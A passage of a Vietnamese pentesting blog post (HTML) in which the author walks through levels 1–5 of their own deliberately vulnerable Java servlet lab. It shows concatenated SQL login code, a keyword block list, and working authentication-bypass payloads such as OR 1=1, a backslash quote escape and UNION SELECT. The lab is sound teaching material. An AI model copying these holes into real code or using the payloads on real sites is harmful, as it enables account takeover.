@@ -1,0 +1,491 @@
+<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java Servlet Sql Injection Vulnerability by @Phatmh | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Java Servlet Sql Injection Vulnerability by @PhatmhTổng quan cấu trúc file java123456789101112131415161718192021222324252627282930313233343536373839+---.idea   +---dataSources+---.mvn   +---wrapper+--">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java Servlet Sql Injection Vulnerability by @Phatmh">
+<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-09-09-Servlet-Sql-Injection/index.html">
+<meta property="og:site_name" content="Phat Mai Blog">
+<meta property="og:description" content="Java Servlet Sql Injection Vulnerability by @PhatmhTổng quan cấu trúc file java123456789101112131415161718192021222324252627282930313233343536373839+---.idea   +---dataSources+---.mvn   +---wrapper+--">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pzhat.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-11-14T19:34:38.215Z">
+<meta property="article:modified_time" content="2025-10-24T05:38:35.000Z">
+<meta property="article:author" content="Phat Mai">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pzhat.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Java Servlet Sql Injection Vulnerability by @Phatmh",
+  "url": "https://pzhat.github.io/2025/11/15/2025-09-09-Servlet-Sql-Injection/",
+  "image": "https://pzhat.github.io/img/butterfly-icon.png",
+  "datePublished": "2025-11-14T19:34:38.215Z",
+  "dateModified": "2025-10-24T05:38:35.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Phat Mai",
+      "url": "https://pzhat.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-09-09-Servlet-Sql-Injection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Java Servlet Sql Injection Vulnerability by @Phatmh',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Java Servlet Sql Injection Vulnerability by @Phatmh</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">Java Servlet Sql Injection Vulnerability by @Phatmh</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.215Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-24T05:38:35.000Z" title="Updated 2025-10-24 12:38:35">2025-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Java-Servlet-Sql-Injection-Vulnerability-by-Phatmh"><a href="#Java-Servlet-Sql-Injection-Vulnerability-by-Phatmh" class="headerlink" title="Java Servlet Sql Injection Vulnerability by @Phatmh"></a>Java Servlet Sql Injection Vulnerability by @Phatmh</h1><h3 id="Tong-quan-cau-truc-file-java"><a href="#Tong-quan-cau-truc-file-java" class="headerlink" title="Tổng quan cấu trúc file java"></a>Tổng quan cấu trúc file java</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">+---.idea</span><br><span class="line">   +---dataSources</span><br><span class="line">+---.mvn</span><br><span class="line">   +---wrapper</span><br><span class="line">+---src</span><br><span class="line">   +---main</span><br><span class="line">      +---java</span><br><span class="line">         +---sql_injection</span><br><span class="line">             +---controller</span><br><span class="line">             +---dao</span><br><span class="line">             +---model</span><br><span class="line">             +---util</span><br><span class="line">      +---resources</span><br><span class="line">         +---META-INF</span><br><span class="line">      +---webapp</span><br><span class="line">          +---WEB-INF</span><br><span class="line">   +---test</span><br><span class="line">       +---java</span><br><span class="line">       +---resources</span><br><span class="line">+---target</span><br><span class="line">    +---classes</span><br><span class="line">       +---META-INF</span><br><span class="line">       +---sql_injection</span><br><span class="line">           +---controller</span><br><span class="line">           +---dao</span><br><span class="line">           +---model</span><br><span class="line">           +---util</span><br><span class="line">    +---generated-sources</span><br><span class="line">       +---annotations</span><br><span class="line">    +---Sql_Injection-1.0-SNAPSHOT</span><br><span class="line">        +---META-INF</span><br><span class="line">        +---WEB-INF</span><br><span class="line">            +---classes</span><br><span class="line">                +---META-INF</span><br><span class="line">                +---sql_injection</span><br><span class="line">                    +---controller</span><br><span class="line">                    +---dao</span><br><span class="line">                    +---model</span><br><span class="line">                    +---util</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/S16Q8BvYxx.png" alt="image">    </p>
+<pre><code>Cấu trúc của project được viết bằng mô hình MVC với UserDAO là nơi xử lý logic chính. Tại đây mình tạo ra 11 level tương ứng với các độ khó khác nhau. Ở đây basic sẽ là 1-5 và 6-11 sẽ là hard.
+</code></pre>
+<h3 id="Source-Code-Github"><a href="#Source-Code-Github" class="headerlink" title="Source Code (Github)"></a>Source Code (Github)</h3><p><a target="_blank" rel="noopener" href="https://github.com/pzhat/Sql_Injection_Lab">Github</a> </p>
+<h3 id="Tien-hanh-phan-tich-cach-level-va-POC"><a href="#Tien-hanh-phan-tich-cach-level-va-POC" class="headerlink" title="Tiến hành phân tích cách level và POC"></a>Tiến hành phân tích cách level và POC</h3><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h4>  <summary>SQL Injection Level 1</summary>
+    
+<p>  <img src="https://hackmd.io/_uploads/H1KLMNBwxe.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> public <span class="keyword">User</span> loginLevel1(String username, String password) throws Exception &#123;</span><br><span class="line">    String query <span class="operator">=</span> &quot;SELECT username, password FROM users WHERE username=&#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span></span><br><span class="line">            &quot;&#x27; AND password=MD5(&#x27;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;&#x27;)&quot;;</span><br><span class="line">    System.out.println(&quot;DEBUG SQL Level 1: &quot; <span class="operator">+</span> query);</span><br><span class="line">    try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">         Statement stmt <span class="operator">=</span> conn.createStatement();</span><br><span class="line">         ResultSet rs <span class="operator">=</span> stmt.executeQuery(query)) &#123;</span><br><span class="line">        if (rs.next()) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">User</span>(rs.getString(<span class="number">1</span>), rs.getString(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Hàm loginLevel1 nhận vào username và password, sau đó kiểm tra xem có người dùng nào trùng khớp không bằng cách truy vấn CSDL.</li>
+<li>Nếu đúng, trả về User object chứa username và password. Nếu không, trả về null.</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String query = &quot;SELECT username, password FROM users WHERE username=&#x27;&quot; + username +</span><br><span class="line">            &quot;&#x27; AND password=MD5(&#x27;&quot; + password + &quot;&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Biến username và password được nối trực tiếp vào chuỗi truy vấn SQL mà không qua kiểm tra hay escape, gây ra lỗ hổng SQLi.</li>
+<li>Hàm MD5(‘password’) là để so sánh mật khẩu đã mã hóa MD5. Nhưng attacker hoàn toàn có thể bypass với đoạn SQL payload logic.</li>
+</ul>
+<p>Ở đây ta sử dụng payload là username&#x3D;’OR 1&#x3D;1 – và password là cái gì cũng được vì nó sẽ luôn trả về True vì mình xài boolean luôn true mà vì thế nó sẽ trả về hết bảng ở đây mình đã để khi bypass nó sẽ đăng nhập vào cái user đầu tiên trên bảng.</p>
+<p><img src="https://hackmd.io/_uploads/H1nc5ESvxl.png" alt="image"></p>
+<p>Khi thực hiện truy vấn SQL, điều kiện WHERE luôn đúng → Đăng nhập thành công với tài khoản đầu tiên trong bảng users.</p>
+<p><img src="https://hackmd.io/_uploads/ByH-s4HPex.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B1BfsNBvle.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ry7sTESvlg.png" alt="image"></p>
+<p>Thành công bypass qua Level 1 bằng cách dùng <code>&#39;</code> để bypass qua logic cộng chuỗi.</p>
+<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h4>  <summary>SQL Injection Level 2</summary>
+    
+<p>  Đến với LV2 thì bây giờ developer đã sử dụng thêm một số biện pháp bảo vệ nhưng vẫn có thể dễ dàng bypass qua vì ở đây dev chỉ bảo vệ bằng cách sử dụng dấu <code>&quot;</code> để bọc lại câu SQL.</p>
+<p><img src="https://hackmd.io/_uploads/HyARoESwel.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">User</span> loginLevel2(String username, String password) throws Exception &#123;</span><br><span class="line">       String query <span class="operator">=</span> &quot;SELECT username, password FROM users WHERE username=\&quot;&quot; + username +</span><br><span class="line">               &quot;\&quot; AND password=MD5(\&quot;&quot; + password + &quot;\&quot;)&quot;;</span><br><span class="line">       System.out.println(&quot;DEBUG SQL Level 2: &quot; <span class="operator">+</span> query);</span><br><span class="line">       try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">            Statement stmt <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            ResultSet rs <span class="operator">=</span> stmt.executeQuery(query)) &#123;</span><br><span class="line">           if (rs.next()) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">User</span>(rs.getString(<span class="number">1</span>), rs.getString(<span class="number">2</span>));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>Hàm loginLevel2 vẫn là hàm xác thực người dùng bằng username và password, so sánh với password mã hóa MD5 trong CSDL. Cách thức hoạt động hoàn toàn giống với loginLevel1, nhưng cú pháp chuỗi trong SQL đã thay đổi từ ‘single quotes’ thành “double quotes”</p>
+<p><img src="https://hackmd.io/_uploads/r1j2grrvgl.png" alt="image"></p>
+<p>Tiến hành test thử câu payload của lv1 vào lv2 để xem nó có bypass được không.</p>
+<p><img src="https://hackmd.io/_uploads/r1CAgrSDgl.png" alt="image"></p>
+<p>Trả về fail chứng tỏ đã dính lỗi ở phần payload vì ở đây dấu <code>&#39;</code> đã không còn được dùng thay vào đó dấu <code>&quot;</code> đã được dùng để bọc câu SQL.<br>Vậy nên để có thể bypass được lv2 ta sẽ dùng dấu <code>&quot;</code> để escape ra khỏi chuỗi để tạo nên một chuỗi SQL hoàn chỉnh.</p>
+<p><img src="https://hackmd.io/_uploads/rJlmfrSDgx.png" alt="image"></p>
+<p>Ở đây mình sử dụng payload <code>&quot; OR 1=1 -- -</code> với password là 1 hoặc cái gì cũng được hết lúc này câu truy vấn sẽ thành <code>SELECT username, password FROM users WHERE username=&quot;&quot; OR 1=1 -- &quot; AND password=MD5(&quot;1&quot;) </code> Với phần password đã bị comment lại.</p>
+<p><img src="https://hackmd.io/_uploads/ByeqGrBwex.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B1ZAzHrDge.png" alt="image"></p>
+<p>Thành công login vào user admin.</p>
+<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h4>  <summary>SQL Injection Level 3</summary>
+    
+<p><img src="https://hackmd.io/_uploads/ryPg4HSDgx.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">User</span> loginLevel3(String username, String password) throws Exception &#123;</span><br><span class="line">    String query <span class="operator">=</span> &quot;SELECT username, password FROM users WHERE username=LOWER(&#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span> &quot;&#x27;) AND password=MD5(&#x27;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;&#x27;)&quot;;</span><br><span class="line">    System.out.println(&quot;DEBUG SQL Level 3: &quot; <span class="operator">+</span> query);</span><br><span class="line">    try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">         Statement stmt <span class="operator">=</span> conn.createStatement();</span><br><span class="line">         ResultSet rs <span class="operator">=</span> stmt.executeQuery(query)) &#123;</span><br><span class="line">        if (rs.next()) <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">User</span>(rs.getString(<span class="number">1</span>), rs.getString(<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>Đến với lv3 ở đây có lẽ vẫn không có sự khac biệt mấy so với lv1 lv2 có thể thấy sự khác biệt duy nhất là <code>username=LOWER(&#39;&quot; + username + &quot;&#39;)</code> ở đây dev sử dụng LOWER để lowercase hết username trong sql nhưng hàm này ngoài tác dụng đó ra thì nó không hề làm gì thêm để phòng thủ.</p>
+<p><img src="https://hackmd.io/_uploads/SJAfdrHPex.png" alt="image"></p>
+<p>Tiến hành thử lại payload cũ.</p>
+<p><img src="https://hackmd.io/_uploads/HkJNuBrDxg.png" alt="image"></p>
+<p>Dính liền phải lỗi <code>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; at line 1</code> dựa theo lỗi này thì có vẻ gần dấu <code>&#39;</code> có vấn đề.<br>Ta có thể nhìn thấy ngay rằng hàm LOWER() khi ta dùng payload cũ nó chỉ cắt được chuỗi đoạn <code>LOWER(&#39;&#39;</code> chứ ta chưa hề đóng lại hàm để nó nhận rằng là một hàm hoàn chỉnh nên ta sẽ tiến hành sửa lại payload.</p>
+<p><img src="https://hackmd.io/_uploads/SkCUKBHDll.png" alt="image"></p>
+<p>Sử dụng payload này sẽ giúp ta đi qua đc LOWER và sau đó là toán tử OR cùng với – để comment hết tất cả đoạn truy vấn ở sau.</p>
+<p><img src="https://hackmd.io/_uploads/B16cKBSwle.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B14CYHBwxl.png" alt="image"></p>
+<p>Thành công đăng nhập vào.</p>
+<h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h4>  <summary>SQL Injection Level 4</summary>
+    
+<p>  <img src="https://hackmd.io/_uploads/S1nU5BBPle.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">User</span> loginLevel4(String username, String password) throws Exception &#123;</span><br><span class="line">       String[] sqlKeywords <span class="operator">=</span> &#123;</span><br><span class="line">               &quot;union&quot;, &quot;select&quot;, &quot;from&quot;, &quot;insert&quot;, &quot;update&quot;, &quot;delete&quot;,</span><br><span class="line">               &quot;drop&quot;, &quot;create&quot;, &quot;alter&quot;, &quot;order by&quot;, &quot;group by&quot;, &quot;having&quot;,</span><br><span class="line">               &quot;where&quot;, &quot;or&quot;, &quot;and&quot;, &quot;exec&quot;, &quot;execute&quot;, &quot;sp_&quot;, &quot;xp_&quot;,</span><br><span class="line">               &quot;--&quot;, &quot;/*&quot;, &quot;*/&quot;, &quot;;&quot;, &quot;char&quot;, &quot;nchar&quot;, &quot;varchar&quot;, &quot;nvarchar&quot;,</span><br><span class="line">               &quot;waitfor&quot;, &quot;delay&quot;, &quot;benchmark&quot;, &quot;sleep&quot;</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       String usernameLower <span class="operator">=</span> username.toLowerCase();</span><br><span class="line">       String passwordLower <span class="operator">=</span> password.toLowerCase();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (String keyword : sqlKeywords) &#123;</span><br><span class="line">           if (usernameLower.contains(keyword) <span class="operator">||</span> passwordLower.contains(keyword)) &#123;</span><br><span class="line">               throw <span class="keyword">new</span> Exception(&quot;SQLI detected&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       username <span class="operator">=</span> username.replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;<span class="string">&#x27;&quot;, &quot;&quot;);</span></span><br><span class="line"><span class="string">       password = password.replace(&quot;\&quot;&quot;, &quot;&quot;).replace(&quot;&#x27;</span>&quot;, &quot;&quot;);</span><br><span class="line">       String query = &quot;<span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span>\&quot;&quot; <span class="operator">+</span> username <span class="operator">+</span> &quot;\&quot; <span class="keyword">AND</span> password<span class="operator">=</span>MD5(\&quot;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;\&quot;)&quot;;</span><br><span class="line">       System.out.println(&quot;DEBUG <span class="keyword">SQL</span> Level <span class="number">4</span>: &quot; + query);</span><br><span class="line"></span><br><span class="line">       try (Connection conn = DBConnection.getConnection();</span><br><span class="line">            Statement stmt = conn.createStatement();</span><br><span class="line">            ResultSet rs = stmt.executeQuery(query))&#123;</span><br><span class="line">           if (rs.next()) return new User(rs.getString(1), rs.getString(2));</span><br><span class="line">       &#125;</span><br><span class="line">       return null;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>Đến với lv4 anh dev đã fix lỗi bằng cách sử dụng hàm <code>replace()</code> để loại bỏ các dấu <code>&#39;&#39;</code> và dấu <code>&quot;&quot;</code> trong câu truy vấn vậy nên ta sẽ không thể truyền dấu nháy để ta thoát khỏi câu truy vấn.</p>
+<p><img src="https://hackmd.io/_uploads/Bymf1UHwll.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rJ6zyUrvxe.png" alt="image"></p>
+<p>Dính ngay login fail.<br>Vậy ngoài 2 dấu kia ra liệu mình có cách nào để escape khỏi câu truy vấn không?.<br>Câu trả lời là có, trong mysql mặc định của nó sẽ cho phép sử dụng dấu <code>\</code> để escape trong câu truy vấn vậy nên ta sẽ tận dụng nó để exploit.<br>Dấu \ sẽ escape dấu “ tiếp theo → dấu “ trở thành ký tự thường trong chuỗi, không còn là ký tự đóng chuỗi”<br>Nếu mình escape được dấu <code>&quot;</code> ta có thể thêm ở phần password để payload trở thành <code>SELECT username FROM users WHERE username=&quot;\&quot; AND password=MD5(&quot; OR 1=1 -- -&quot;)</code><br>Sau khi escape, parser SQL sẽ hiểu thành: username&#x3D;”\ AND password&#x3D;MD5(“ OR 1&#x3D;1 – -“)<br>Phần – - comment phần cuối, chỉ còn điều kiện OR 1&#x3D;1 → luôn đúng<br>Kết quả: bypass authentication thành công</p>
+<p>Ở đây mình sẽ xài payload là <code>username = \</code> với phần password là <code> OR 1=1 -- -</code></p>
+<p><img src="https://hackmd.io/_uploads/Sy-_lIBPgg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Syo_lLrvxx.png" alt="image"></p>
+<p>Thành công khai thác được sqli ở lv này.</p>
+<h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h4>  <summary>SQL Injection Level 5</summary>
+    
+<p> <img src="https://hackmd.io/_uploads/BydUzISvll.png" alt="image"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">User</span> getUserByUsername(String username) throws Exception &#123;</span><br><span class="line">        String query <span class="operator">=</span> &quot;SELECT username, password FROM users WHERE username=&#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span> &quot;&#x27;&quot;;</span><br><span class="line">        System.out.println(&quot;DEBUG GetUser: &quot; <span class="operator">+</span> query);</span><br><span class="line">        try (Connection conn <span class="operator">=</span> DBConnection.getConnection();</span><br><span class="line">             Statement stmt <span class="operator">=</span> conn.createStatement();</span><br><span class="line">             ResultSet rs <span class="operator">=</span> stmt.executeQuery(query)) &#123;</span><br><span class="line">            if (rs.next()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">User</span>(rs.getString(&quot;username&quot;), rs.getString(&quot;password&quot;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>Đến với lv5 thì ở đây mình chỉ code một đoạn sql đơn giản như lv đầu nhưng vấn đề là nếu như có thêm 1 phần xác thực user ví dụ như nó bắt buộc user là admin thì phải làm sao.<br>vậy nên cách tấn công UNION based là cách hiệu quả nhất ở đây.</p>
+<p><img src="https://hackmd.io/_uploads/BJBdKaSwgg.png" alt="image"></p>
+<p>Ở đây mình sẽ dùng payload là <code>&#39; UNION SELECT &#39;admin&#39;, &#39;NULL&#39; -- -</code> với password là bất kì thứ gì cũng được vì phần pass đã bị commented lại.</p>
+<p><img src="https://hackmd.io/_uploads/ByfptTrvgx.png" alt="image"></p>
+<p>Thành công truy vấn đăng nhập bằng cách sử dụng UNION ở đây dùng UNION ở đây câu query sau khi bị inject sẽ là <code>SELECT username, password FROM users WHERE username=&#39;&#39; UNION SELECT &#39;admin&#39;, &#39;NULL&#39; -- &#39;; </code></p>
+<p><img src="https://hackmd.io/_uploads/rJ6CjaHwgg.png" alt="image"></p>
+<h4 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h4>  <summary>SQL Injection Level 6</summary>
+    
+<p>  <img src="https://hackmd.io/_uploads/rJPGiCSDxg.png" alt="image"></p>
